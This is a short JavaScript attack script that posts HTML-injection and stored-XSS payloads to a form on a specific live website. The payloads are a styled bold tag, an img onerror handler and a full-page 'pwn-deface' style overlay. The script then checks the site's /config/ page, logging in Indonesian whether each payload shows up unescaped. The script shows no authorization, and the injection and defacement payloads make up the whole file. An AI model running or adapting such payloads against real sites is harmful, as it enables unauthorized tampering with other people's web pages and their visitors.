import { makeClient } from './lib.mjs';
import fs from 'fs';
const c = makeClient('https://tutorialinjectid.my.id');
const T = '/config/index.php?page=1';
const H = { 'content-type': 'application/x-www-form-urlencoded', accept: 'application/json, text/plain, */*', origin: 'https://tutorialinjectid.my.id', referer: 'https://tutorialinjectid.my.id/config/' };
const cases = [
  ['bold', 'https://sfile.co/VCa4EJPMs7J', '<b style="color:#e11d48">PWN-BOLD</b>'],
  ['img_onerror', 'https://sfile.co/VCa4EJPMs7J', 'PWN-IMG<img src=x onerror="console.log(1)">'],
  ['style_tag', 'https://sfile.co/2OWdHp9t3GP', '<style>#pwn-deface{position:fixed;inset:0;pointer-events:none;background:rgba(255,0,80,.18);z-index:9999}</style><div id=pwn-deface></div>PWN-STYLE'],
];
await c.get(T);
for (const [k, u, t] of cases) {
  const body = new URLSearchParams({ action: 'process_download', config_url: u, config_title: t }).toString();
  const r = await c.get(T, { method: 'POST', body, headers: H });
  console.log(`${k.padEnd(12)} ${r.status} ${r.body.replace(/\s+/g, ' ').slice(0, 160)}`);
}
const g = await c.get('/config/');
fs.writeFileSync('/tmp/opencode/config_after3.html', g.body);
console.log('\n--- cek HTML mentah di /config/ ---');
for (const n of ['PWN-BOLD', 'PWN-IMG', 'PWN-STYLE', '<b style="color:#e11d48">', 'onerror="console.log(1)"', 'pwn-deface', '&lt;b style', '&quot;']) {
  const i = g.body.indexOf(n);
  console.log((i > 0 ? 'ADA  ' : 'tidak '), n.padEnd(30), i > 0 ? ' :: ' + g.body.slice(Math.max(0, i - 90), i + 110).replace(/\s+/g, ' ') : '');
}
